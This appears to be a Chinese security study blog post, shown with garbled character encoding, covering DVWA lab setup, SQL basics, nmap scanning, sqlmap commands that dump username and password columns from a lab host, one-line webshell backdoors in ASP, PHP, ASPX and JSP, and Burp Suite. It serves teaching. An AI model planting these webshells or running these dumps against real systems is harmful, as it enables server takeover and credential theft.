<p>æ–°å»ºæˆåŠŸåï¼ŒåŒå‡»æˆ–è€…å³å‡»é€‰æ‹©æ‰“å¼€æ•°æ®åº“ï¼Œå˜æˆç»¿è‰²ä¹‹åï¼Œè¡¨æ˜æ­£å¸¸è¿è¡Œã€‚</p>
<p>æ‰“å¼€çš„åŸºç¡€ä¸Šï¼Œå³å‡»<code>è¿è¡Œsqlæ–‡ä»¶</code>ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202215558254.png" class="" title="image-20241202215558254">
<p>æ— ä¸¥é‡æŠ¥é”™å°±å¯å¯¼å…¥sqlæ–‡ä»¶ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202215715270.png" class="" title="image-20241202215715270">
<p>èƒ½æ‰§è¡ŒæˆåŠŸï¼Œè®°å¾—å…³é—­æ•°æ®åº“ï¼Œç„¶åé‡æ–°æ‰“å¼€ï¼Œå°±èƒ½ç›´æ¥çœ‹åˆ°å¯¼å…¥åçš„æ•°æ®æ–‡ä»¶ã€‚</p>
<h2 id="æ­å»ºé¶åœºç¯å¢ƒ-DVWA">æ­å»ºé¶åœºç¯å¢ƒ-DVWA</h2>
<blockquote>
<p><a href="https://github.com/digininja/DVWA">GitHub - digiï¼›ninja/DVWA: Damn Vulnerable Web Application (DVWA)</a></p>
<p><a href="https://blog.csdn.net/2302_82189125/article/details/135834194">å¦‚ä½•æ­å»º DVWA é¶åœºä¿å§†çº§æ•™ç¨‹ï¼ˆé™„é“¾æ¥ï¼‰_dvwaé¶åœºæ­å»º-CSDNåšå®¢</a></p>
<p>å…¶ä»–é¶åœºç¯å¢ƒï¼špikachu</p>
</blockquote>
<img src="/2024/12/02/web-commontools-install/image-20241202225832201.png" class="" title="image-20241202225832201">
<p>æ–°å»ºæ•°æ®åº“ä¹‹å‰ä¸€èˆ¬ä¼šè¦æ±‚ä¿®æ”¹<code>root</code>å¯†ç ï¼Œæ–°å»ºæ•°æ®åº“ä¹‹åï¼Œå†é‡æ–°è¿æ¥Navicatã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202225957800.png" class="" title="image-20241202225957800">
<p>é…ç½®ç½‘ç«™ã€‚</p>
<p>ä½¿ç”¨è®¾ç½®çš„ç”¨æˆ·åä»¥åŠå¯†ç ç™»å½•ç½‘ç«™ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202230132938.png" class="" title="image-20241202230132938">
<p>æ ‡çº¢çš„éƒ¨åˆ†éœ€è¦è¿›è¡Œä¿®æ”¹ã€‚</p>
<p><code>reCAPTCHA key</code>ï¼Œåœ¨<code>DVWA/conifg.ini.php</code>ä¸­è¿›è¡Œæ–°å¢ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202230518208.png" class="" title="image-20241202230518208">
<p>åˆ·æ–°åå¯çœ‹åˆ°ä¿®æ”¹ã€‚</p>
<p>å…¶ä»–å‚æ•°ï¼Œåœ¨<code>php.xxx/php.ini</code>ä¸­ä¿®æ”¹ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202230726368.png" class="" title="image-20241202230726368">
<p>ä¿å­˜åï¼Œé€‰æ‹©é¡µé¢çš„<code>Create Database</code>ï¼Œç„¶åé‡æ–°ç™»å½•ã€‚</p>
<p>æ­¤æ—¶ä½¿ç”¨çš„ç”¨æˆ·åä»¥åŠå¯†ç åˆ†åˆ«ä¸º<code>admin</code>ä»¥åŠ<code>password</code>ã€‚ï¼ˆæœ‰5ä¸ªé»˜è®¤ç”¨æˆ·ååŠå¯†ç ï¼‰</p>
<img src="/2024/12/02/web-commontools-install/image-20241202231153916.png" class="" title="image-20241202231153916">
<p>è¿›å…¥åˆ°é¶åœºç¯å¢ƒã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202230959512.png" class="" title="image-20241202230959512">
<p>å¯ä¿®æ”¹é¶åœºéš¾åº¦ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202231737693.png" class="" title="image-20241202231737693">
<h1>å®‰è£…Winhex</h1>
<blockquote>
<p><a href="http://www.winhex.com/winhex/">http://www.winhex.com/winhex/</a></p>
</blockquote>
<ul>
<li>æŸ¥çœ‹æ–‡ä»¶16è¿›åˆ¶ï¼šæ–‡ä»¶ç±»å‹ç›¸å¯¹è¾ƒå¤šï¼Œå›¾ç‰‡æ–‡ä»¶ã€éŸ³é¢‘æ–‡ä»¶ã€åº”ç”¨ç¨‹åºæ–‡ä»¶</li>
<li>æŸ¥çœ‹é•œåƒæ–‡ä»¶</li>
</ul>
<h1>å®‰è£…Wireshark</h1>
<blockquote>
<p><a href="https://www.wireshark.org/download.html">Wireshark Â· Download</a></p>
</blockquote>
<ul>
<li>è¿›è¡Œ<strong>æµé‡åŒ…åˆ†æ</strong></li>
<li>æ–‡ä»¶åç¼€åï¼š<code>.pcap</code>/<code>.pcapng</code></li>
</ul>
<h1>SQLè¯­å¥</h1>
<blockquote>
<p>ä¸åŒºåˆ†å¤§å°å†™ï¼Œæœ‰Navicatçš„æƒ…å†µä¸‹ï¼Œå¯è§†åŒ–åç›¸å¯¹å®¹æ˜“æŸ¥çœ‹æ‰§è¡Œåçš„ç»“æœã€‚</p>
<p><a href="https://www.runoob.com/sql/sql-syntax.html">SQL è¯­æ³• | èœé¸Ÿæ•™ç¨‹</a></p>
</blockquote>
<ul>
<li>ä½¿ç”¨æ•°æ®åº“ï¼š<code>USE [DATABASE];</code></li>
<li>æŸ¥çœ‹æ‰€æœ‰è¡¨æ ¼ï¼š<code>SHOW TABLES;</code></li>
<li>æŸ¥çœ‹æŸå¼ è¡¨çš„æ‰€æœ‰æ•°æ®ï¼š<code>SELECT * FROM [TABLE]</code></li>
<li>æŸ¥çœ‹æŸåˆ—çš„æ‰€æœ‰æ•°æ®ï¼š<code>SELECT [COLUMN] FROM [TABLE];</code></li>
<li>æŸ¥çœ‹æŒ‡å®šè¡¨æŒ‡å®šæ•°æ®ï¼ˆæ¡ä»¶ï¼‰+ <code>WHERE</code>ï¼š<code>SELECT * FROM [TABLE] WHERE [CONDITION]</code></li>
</ul>
<p><em>where å­å¥åˆè¢«ç§°ä¸ºæ¡ä»¶å­å¥ï¼Œç”¨äºç­›é€‰æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®é›†ï¼ŒæŒ‡å®šçš„æ¡ä»¶è¯­å¥ä¸­å¯ä»¥ä½¿ç”¨åŸºæœ¬çš„ç®—æœ¯ã€å…³ç³»å’Œé€»è¾‘è¿ç®—ï¼Œä¾‹å¦‚ï¼š&gt;,&lt;,=,!=,&amp;&amp;,||ã€‚</em></p>
<ul>
<li>â€¦â€¦</li>
</ul>
<h2 id="å¸¸è§å‘½ä»¤">å¸¸è§å‘½ä»¤</h2>
<ul>
<li><strong>SELECT</strong> - ä»æ•°æ®åº“ä¸­æå–æ•°æ®</li>
<li><strong>UPDATE</strong> - æ›´æ–°æ•°æ®åº“ä¸­çš„æ•°æ®</li>
<li><strong>DELETE</strong> - ä»æ•°æ®åº“ä¸­åˆ é™¤æ•°æ®</li>
<li><strong>INSERT INTO</strong> - å‘æ•°æ®åº“ä¸­æ’å…¥æ–°æ•°æ®</li>
<li><strong>CREATE DATABASE</strong> - åˆ›å»ºæ–°æ•°æ®åº“</li>
<li><strong>ALTER DATABASE</strong> - ä¿®æ”¹æ•°æ®åº“</li>
<li><strong>CREATE TABLE</strong> - åˆ›å»ºæ–°è¡¨</li>
<li><strong>ALTER TABLE</strong> - å˜æ›´ï¼ˆæ”¹å˜ï¼‰æ•°æ®åº“è¡¨</li>
<li><strong>DROP TABLE</strong> - åˆ é™¤è¡¨</li>
</ul>
<p><strong>SELECT</strong>ï¼šç”¨äºä»æ•°æ®åº“ä¸­æŸ¥è¯¢æ•°æ®ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE condition</span><br><span class="line">ORDER BY column_name [ASC|DESC];</span><br></pre></td></tr></table></figure>
<ul>
<li><code>column_name(s)</code>: è¦æŸ¥è¯¢çš„åˆ—ã€‚</li>
<li><code>table_name</code>: è¦æŸ¥è¯¢çš„è¡¨ã€‚</li>
<li><code>condition</code>: æŸ¥è¯¢æ¡ä»¶ï¼ˆå¯é€‰ï¼‰ã€‚</li>
<li><code>ORDER BY</code>: æ’åºæ–¹å¼ï¼Œ<code>ASC</code> è¡¨ç¤ºå‡åºï¼Œ<code>DESC</code> è¡¨ç¤ºé™åºï¼ˆå¯é€‰ï¼‰ã€‚</li>
</ul>
<p><strong>INSERT INTO</strong>ï¼šç”¨äºå‘æ•°æ®åº“è¡¨ä¸­æ’å…¥æ–°æ•°æ®ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO table_name (column1, column2, ...)</span><br><span class="line">VALUES (value1, value2, ...)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>table_name</code>: è¦æ’å…¥æ•°æ®çš„è¡¨ã€‚</li>
<li><code>column1, column2, ...</code>: è¦æ’å…¥æ•°æ®çš„åˆ—ã€‚</li>
<li><code>value1, value2, ...</code>: å¯¹åº”åˆ—çš„å€¼ã€‚</li>
</ul>
<p><strong>UPDATE</strong>ï¼šç”¨äºæ›´æ–°æ•°æ®åº“è¡¨ä¸­çš„ç°æœ‰æ•°æ®ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE table_name</span><br><span class="line">SET column1 = value1, column2 = value2, ...</span><br><span class="line">WHERE condition</span><br></pre></td></tr></table></figure>
<ul>
<li><code>table_name</code>: è¦æ›´æ–°æ•°æ®çš„è¡¨ã€‚</li>
<li><code>column1 = value1, column2 = value2, ...</code>: è¦æ›´æ–°çš„åˆ—åŠå…¶æ–°å€¼ã€‚</li>
<li><code>condition</code>: æ›´æ–°æ¡ä»¶ã€‚</li>
</ul>
<p><strong>DELETE</strong>ï¼šç”¨äºä»æ•°æ®åº“è¡¨ä¸­åˆ é™¤æ•°æ®ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM table_name</span><br><span class="line">WHERE condition</span><br></pre></td></tr></table></figure>
<ul>
<li><code>table_name</code>: è¦åˆ é™¤æ•°æ®çš„è¡¨ã€‚</li>
<li><code>condition</code>: åˆ é™¤æ¡ä»¶ã€‚</li>
</ul>
<p><strong>CREATE TABLE</strong>ï¼šç”¨äºåˆ›å»ºæ–°çš„æ•°æ®åº“è¡¨ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE table_name (</span><br><span class="line">    column1 data_type constraint,</span><br><span class="line">    column2 data_type constraint,</span><br><span class="line">    ...</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>table_name</code>: è¦åˆ›å»ºçš„è¡¨åã€‚</li>
<li><code>column1, column2, ...</code>: è¡¨çš„åˆ—ã€‚</li>
<li><code>data_type</code>: åˆ—çš„æ•°æ®ç±»å‹ï¼ˆå¦‚ <code>INT</code>ã€<code>VARCHAR</code> ç­‰ï¼‰ã€‚</li>
<li><code>constraint</code>: åˆ—çš„çº¦æŸï¼ˆå¦‚ <code>PRIMARY KEY</code>ã€<code>NOT NULL</code> ç­‰ï¼‰ã€‚</li>
</ul>
<p><strong>ALTER TABLE</strong>ï¼šç”¨äºä¿®æ”¹ç°æœ‰æ•°æ®åº“è¡¨çš„ç»“æ„ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE table_name</span><br><span class="line">ADD column_name data_type</span><br></pre></td></tr></table></figure>
<ul>
<li><code>table_name</code>: è¦ä¿®æ”¹çš„è¡¨ã€‚</li>
<li><code>column_name</code>: è¦æ·»åŠ çš„åˆ—ã€‚</li>
<li><code>data_type</code>: åˆ—çš„æ•°æ®ç±»å‹ã€‚</li>
</ul>
<p>æˆ–ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE table_name</span><br><span class="line">DROP COLUMN column_name</span><br></pre></td></tr></table></figure>
<ul>
<li><code>column_name</code>: è¦åˆ é™¤çš„åˆ—ã€‚</li>
</ul>
<p><strong>DROP TABLE</strong>ï¼šç”¨äºåˆ é™¤æ•°æ®åº“è¡¨ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE table_name</span><br></pre></td></tr></table></figure>
<ul>
<li><code>table_name</code>: è¦åˆ é™¤çš„è¡¨ã€‚</li>
</ul>
<h1>nmap</h1>
<blockquote>
<p>kaliè‡ªå¸¦è¯¥åŠŸèƒ½</p>
<p><a href="https://nmap.org/man/zh/index.html">Nmapå‚è€ƒæŒ‡å—(Man Page)</a></p>
</blockquote>
<p>Nmapï¼Œå³Network Mapperï¼Œæ˜¯ä¸€ä¸ªç½‘ç»œè¿æ¥ç«¯æ‰«æè½¯ä»¶ï¼Œç”¨æ¥æ‰«æç½‘ä¸Šç”µè„‘å¼€æ”¾çš„ç½‘ç»œè¿æ¥ç«¯ã€‚ç¡®å®šå“ªäº›æœåŠ¡è¿è¡Œåœ¨å“ªäº›è¿æ¥ç«¯ï¼Œå¹¶ä¸”æ¨æ–­è®¡ç®—æœºè¿è¡Œå“ªä¸ªæ“ä½œç³»ç»Ÿï¼ˆè¿™æ˜¯äº¦ç§° fingerprintingï¼‰ã€‚å®ƒæ˜¯ç½‘ç»œç®¡ç†å‘˜å¿…ç”¨çš„è½¯ä»¶ä¹‹ä¸€ï¼Œä»¥åŠç”¨ä»¥è¯„ä¼°ç½‘ç»œç³»ç»Ÿå®‰å…¨ã€‚</p>
<p><strong>å…¶åŸºæœ¬åŠŸèƒ½æœ‰ä¸‰ä¸ªï¼šä¸€æ˜¯æ¢æµ‹ä¸€ç»„ä¸»æœºæ˜¯å¦åœ¨çº¿ï¼›å…¶æ¬¡æ‰«æä¸»æœºç«¯å£ï¼Œå—…æ¢æ‰€æä¾›çš„ç½‘ç»œæœåŠ¡ï¼›è¿˜å¯ä»¥æ¨æ–­ä¸»æœºæ‰€ç”¨çš„æ“ä½œç³»ç»Ÿã€‚</strong></p>
<p>ä½¿ç”¨<code>nmap --help</code>æŸ¥çœ‹æä¾›åŠŸèƒ½ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202222747293.png" class="" title="image-20241202222747293">
<h2 id="å•ç›®æ ‡-å¤šç›®æ ‡-ç½‘æ®µæ‰«æ">å•ç›®æ ‡/å¤šç›®æ ‡/ç½‘æ®µæ‰«æ</h2>
<img src="/2024/12/02/web-commontools-install/image-20241202232317440.png" class="" title="image-20241202232317440">
<ul>
<li>
<p><code>nmap -sP 172.16.5.156</code></p>
</li>
<li>
<p><code>nmap -sP 172.16.5.102 172.16.5.103</code></p>
</li>
<li>
<p><code>nmap -sP 172.16.5.*</code>/<code>nmap -sP 172.16.5.0/24</code></p>
</li>
<li>
<p>â€¦â€¦x.x.x.x</p>
</li>
</ul>
<h2 id="ç«¯å£æ‰«æ">ç«¯å£æ‰«æ</h2>
<img src="/2024/12/02/web-commontools-install/image-20241202232245140.png" class="" title="image-20241202232245140">
<p><em>ä»0ï½65535ï¼Œæ¯ä¸ªç«¯å£å¯¹åº”ä¸€ä¸ªæœåŠ¡</em></p>
<p><em>0-1023ä¸€èˆ¬è¢«ç”¨ä½œçŸ¥åæœåŠ¡å™¨åˆ°ç«¯å£</em></p>
<ul>
<li>
<p>httpï¼š80</p>
</li>
<li>
<p>httpsï¼š443</p>
</li>
<li>
<p>ftpï¼š21</p>
</li>
<li>
<p>sshï¼š22</p>
</li>
<li>
<p>rdpï¼š3389</p>
</li>
<li>
<p>mysqlï¼š3306</p>
</li>
<li>
<p>mssqlï¼š1433</p>
</li>
<li>
<p>oracleï¼š1521</p>
</li>
</ul>
<p><em>é€šå¸¸æƒ…å†µä¸‹ï¼ˆæœªæŒ‡å®šç«¯å£ï¼‰nmapé»˜è®¤æ‰«ææœ€æœ‰å¯èƒ½å¼€å¯çš„1000ä¸ªç«¯å£</em></p>
<p><strong>ç«¯å£çŠ¶æ€ï¼š</strong></p>
<ul>
<li>
<p>nmapæä¾›äº†6ä¸ªç«¯å£çŠ¶æ€ï¼š</p>
</li>
<li>
<p>openï¼šç«¯å£å¼€æ”¾</p>
</li>
<li>
<p>closedï¼šç«¯å£å…³é—­</p>
</li>
<li>
<p>filteredï¼šç«¯å£è¢«è¿‡æ»¤ï¼ˆé˜²ç«å¢™ç­‰ï¼‰</p>
</li>
<li>
<p>unfilteredï¼šnmapä¸èƒ½ç¡®è®¤ç«¯å£æ˜¯å¦å¼€æ”¾ï¼Œä½†æ˜¯æœªè¢«è¿‡æ»¤ï¼ˆACKæ‰«ææ‰ä¼šå‡ºç°è¿™ç§æƒ…å†µï¼Œå¯ä»¥æ¢ç§æ‰«ææ–¹å¼ï¼‰</p>
</li>
<li>
<p>open|filteredï¼šå¼€æ”¾æˆ–è€…è¿‡æ»¤çš„ï¼Œnmapä¸èƒ½ç¡®è®¤ï¼ˆä¸æ˜¯å®Œå…¨è¢«è¿‡æ»¤çš„çŠ¶æ€ï¼‰ã€‚</p>
</li>
<li>
<p>closed|filteredï¼šnmapä¸èƒ½ç¡®è®¤ç«¯å£æ˜¯å…³é—­çš„è¿˜æ˜¯è¢«è¿‡æ»¤çš„ã€‚</p>
</li>
</ul>
<h1>sqlmap</h1>
<blockquote>
<p>kaliè‡ªå¸¦è¯¥åŠŸèƒ½</p>
<p><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
<p><a href="https://blog.csdn.net/weixin_43819747/article/details/136736688">ã€SQLæ³¨å…¥ã€‘Sqlmapä½¿ç”¨æŒ‡å—(æ‰‹æŠŠæ‰‹ä¿å§†ç‰ˆ)æŒç»­æ›´æ–°_sqlmapä½¿ç”¨æ•™ç¨‹-CSDNåšå®¢</a></p>
<p>å¯ä½¿ç”¨é¶åœºï¼šsqli-labã€‚</p>
</blockquote>
<p>SQLmapæ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„SQLæ³¨å…¥å·¥å…·ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯æ‰«æï¼Œå‘ç°å¹¶åˆ©ç”¨ç»™å®šçš„URLçš„SQLæ³¨å…¥æ¼æ´ï¼Œç›®å‰æ”¯æŒçš„æ•°æ®åº“æ˜¯MySQLï¼ŒOracleï¼ŒPostgreSQLï¼ŒMicrosoft SQL Serverï¼ŒMicrosoft Acessï¼ŒIBM DB2ï¼ŒSQLLiteï¼ŒFirebirdï¼ŒSybaseå’ŒSAP MaxDBâ€¦â€¦å…¶å¹¿æ³›çš„åŠŸèƒ½å’Œé€‰é¡¹åŒ…æ‹¬æ•°æ®åº“æŒ‡çº¹ï¼Œæšä¸¾ï¼Œæ•°æ®åº“æå–ï¼Œè®¿é—®ç›®æ ‡æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶åœ¨è·å–å®Œå…¨æ“ä½œæƒé™æ—¶å®è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<p>Sqlmapé‡‡ç”¨äº”ç§ç‹¬ç‰¹çš„SQLæ³¨å…¥æŠ€æœ¯ï¼Œåˆ†åˆ«æ˜¯ï¼š</p>
<ul>
<li>
<p>åŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼Œå³å¯ä»¥æ ¹æ®<strong>è¿”å›é¡µé¢</strong>åˆ¤æ–­æ¡ä»¶çœŸå‡çš„æ³¨å…¥ã€‚</p>
</li>
<li>
<p>åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼Œå³ä¸èƒ½æ ¹æ®é¡µé¢è¿”å›å†…å®¹åˆ¤æ–­ä»»ä½•ä¿¡æ¯ï¼Œç”¨æ¡ä»¶è¯­å¥æŸ¥çœ‹æ—¶é—´å»¶è¿Ÿè¯­å¥æ˜¯å¦æ‰§è¡Œï¼ˆå³é¡µé¢è¿”å›æ—¶é—´æ˜¯å¦å¢åŠ ï¼‰æ¥åˆ¤æ–­ã€‚</p>
</li>
<li>
<p>åŸºäºæŠ¥é”™æ³¨å…¥ï¼Œå³é¡µé¢ä¼šè¿”å›é”™è¯¯ä¿¡æ¯ï¼Œæˆ–è€…æŠŠæ³¨å…¥çš„è¯­å¥çš„ç»“æœç›´æ¥è¿”å›åœ¨é¡µé¢ä¸­ã€‚</p>
</li>
<li>
<p>è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œå¯ä»¥ä½¿ç”¨unionçš„æƒ…å†µä¸‹çš„æ³¨å…¥ã€‚</p>
</li>
<li>
<p>å †æŸ¥è¯¢æ³¨å…¥ï¼Œå¯ä»¥åŒæ—¶æ‰§è¡Œå¤šæ¡è¯­å¥çš„æ‰§è¡Œæ—¶çš„æ³¨å…¥ã€‚</p>
</li>
</ul>
<h2 id="sqlmapåŸºç¡€æ³¨å…¥">sqlmapåŸºç¡€æ³¨å…¥</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># åˆ¤æ–­æœ‰æ— æ³¨å…¥</span><br><span class="line">sqlmap <span class="operator">-</span>u â€œhttp:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.5</span><span class="number">.156</span><span class="operator">/</span>?load<span class="operator">=</span>art<span class="operator">&amp;</span>act<span class="operator">=</span>detail<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">7</span>â€</span><br><span class="line"># æ³¨å…¥æ•°æ®åº“</span><br><span class="line">sqlmap <span class="operator">-</span>u â€œhttp:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.5</span><span class="number">.156</span><span class="operator">/</span>?load<span class="operator">=</span>art<span class="operator">&amp;</span>act<span class="operator">=</span>detail<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">7</span>â€ â€”dbs</span><br><span class="line"># æ³¨å…¥è¡¨</span><br><span class="line">sqlmap <span class="operator">-</span>u â€œhttp:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.5</span><span class="number">.156</span><span class="operator">/</span>?load<span class="operator">=</span>art<span class="operator">&amp;</span>act<span class="operator">=</span>detail<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">7</span>â€ <span class="operator">-</span>D cimer â€”tables</span><br><span class="line"># æ³¨å…¥å­—æ®µ</span><br><span class="line">sqlmap <span class="operator">-</span>u â€œhttp:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.5</span><span class="number">.156</span><span class="operator">/</span>?load<span class="operator">=</span>art<span class="operator">&amp;</span>act<span class="operator">=</span>detail<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">7</span>â€ <span class="operator">-</span>D cimer <span class="operator">-</span>T admin â€”columns</span><br><span class="line"># æ³¨å…¥å†…å®¹</span><br><span class="line">sqlmap <span class="operator">-</span>u â€œhttp:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.5</span><span class="number">.156</span><span class="operator">/</span>?load<span class="operator">=</span>art<span class="operator">&amp;</span>act<span class="operator">=</span>detail<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">7</span>â€ <span class="operator">-</span>D cimer <span class="operator">-</span>T admin <span class="operator">-</span>C â€œusername,passwordâ€ â€”dump</span><br></pre></td></tr></table></figure>
<p>åŸºäºSQLæ³¨å…¥ä»é¢åˆ°ç‚¹çš„è¿‡ç¨‹ï¼ŒæŠ“å–SQLæ³¨å…¥çš„æµé‡ï¼Œåˆ†æé‡ç‚¹ï¼šæ”¾åœ¨<strong>é åä½ç½®å»æ‰¾åˆ°å…³é”®æ•°æ®</strong>ã€‚</p>
<h1>webshell</h1>
<p>webshellå°±æ˜¯ä»¥aspã€phpã€jspæˆ–è€…cgiç­‰ç½‘é¡µæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ä¸€ç§ä»£ç æ‰§è¡Œç¯å¢ƒï¼Œä¹Ÿå¯ä»¥å°†å…¶ç§°åšä¸ºä¸€ç§ç½‘é¡µåé—¨ã€‚é»‘å®¢åœ¨å…¥ä¾µäº†ä¸€ä¸ªç½‘ç«™åï¼Œé€šå¸¸ä¼šå°†aspæˆ–phpåé—¨æ–‡ä»¶ä¸ç½‘ç«™æœåŠ¡å™¨ç›®å½•ä¸‹æ­£å¸¸çš„ç½‘é¡µæ–‡ä»¶æ··åœ¨ä¸€èµ·ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨æµè§ˆå™¨æ¥è®¿é—®aspæˆ–è€…phpåé—¨ï¼Œå¾—åˆ°ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä»¥è¾¾åˆ°æ§åˆ¶ç½‘ç«™æœåŠ¡å™¨çš„ç›®çš„ã€‚</p>
<h2 id="ä¸€å¥è¯æœ¨é©¬">ä¸€å¥è¯æœ¨é©¬</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aspä¸€å¥è¯æœ¨é©¬ï¼š</span><br><span class="line">&lt;%execute(request(&quot;value&quot;))%&gt;</span><br><span class="line"></span><br><span class="line">phpä¸€å¥è¯æœ¨é©¬ï¼š</span><br><span class="line">&lt;?php eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">aspxä¸€å¥è¯æœ¨é©¬ï¼š</span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;%eval(Request.Item[&quot;value&quot;])%&gt;</span><br><span class="line"></span><br><span class="line">jspä¸€å¥è¯æœ¨é©¬ï¼š</span><br><span class="line">ï¼œ%  </span><br><span class="line">f(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;//&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());  </span><br><span class="line">%ï¼</span><br></pre></td></tr></table></figure>
<p><em>Webshellè¦åšå¥½å¤‡ä»½ï¼Œå› ä¸ºç»å¸¸ä¼šè¢«ç”µè„‘æ£€æµ‹ç„¶ååˆ æ‰</em></p>
<p><em>webshellå°±æ˜¯ä»¥aspã€phpã€jspç­‰ç½‘é¡µæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ä¸€ç§ä»£ç æ‰§è¡Œç¯å¢ƒï¼Œä¹Ÿå¯ä»¥å°†å…¶ç§°åšä¸ºä¸€ç§ç½‘é¡µåé—¨ã€‚é»‘å®¢åœ¨å…¥ä¾µäº†ä¸€ä¸ªç½‘ç«™åï¼Œé€šå¸¸ä¼šå°†aspæˆ–phpåé—¨æ–‡ä»¶ä¸ç½‘ç«™æœåŠ¡å™¨ç›®å½•ä¸‹æ­£å¸¸çš„ç½‘é¡µæ–‡ä»¶æ··åœ¨ä¸€èµ·ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨æµè§ˆå™¨æ¥è®¿é—®aspæˆ–è€…phpåé—¨ï¼Œå¾—åˆ°ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä»¥è¾¾åˆ°æ§åˆ¶ç½‘ç«™æœåŠ¡å™¨çš„ç›®çš„ã€‚</em></p>
<p><em>PHPã€evalã€postè¿™å‡ ä¸ªéƒ¨åˆ†ç»„æˆçš„ â€œâ€é‡Œå°±æ˜¯è¿æ¥è¦ç”¨åˆ°çš„å¯†ç </em></p>
<h1>burp suite</h1>
<p>Burp Suite æ˜¯ç”¨äºæ”»å‡»webåº”ç”¨ç¨‹åºçš„é›†æˆå¹³å°ã€‚å®ƒåŒ…å«äº†è®¸å¤šå·¥å…·ï¼Œå¹¶ä¸ºè¿™äº›å·¥å…·è®¾è®¡äº†è®¸å¤šæ¥å£ï¼Œä»¥ä¿ƒè¿›åŠ å¿«æ”»å‡»åº”ç”¨ç¨‹åºçš„è¿‡ç¨‹ã€‚æ‰€æœ‰çš„å·¥å…·éƒ½å…±äº«ä¸€ä¸ªèƒ½å¤„ç†å¹¶æ˜¾ç¤ºHTTPæ¶ˆæ¯ï¼ŒæŒä¹…æ€§ï¼Œè®¤è¯ï¼Œä»£ç†ï¼Œæ—¥å¿—ï¼Œè­¦æŠ¥çš„ä¸€ä¸ªå¼ºå¤§çš„å¯æ‰©å±•çš„æ¡†æ¶ã€‚</p>
<h2 id="Proxy">Proxy</h2>
<p>Proxyä»£ç†æ¨¡å—ä½œä¸ºBurpSuiteçš„æ ¸å¿ƒåŠŸèƒ½ï¼Œæ‹¦æˆªHTTP/Sçš„ä»£ç†æœåŠ¡å™¨ï¼Œä½œä¸ºä¸€ä¸ªåœ¨æµè§ˆå™¨å’Œç›®æ ‡åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´äººï¼Œå…è®¸ä½ æ‹¦æˆªï¼ŒæŸ¥çœ‹ï¼Œä¿®æ”¹åœ¨ä¸¤ä¸ªæ–¹å‘ä¸Šçš„åŸå§‹æ•°æ®æµã€‚</p>
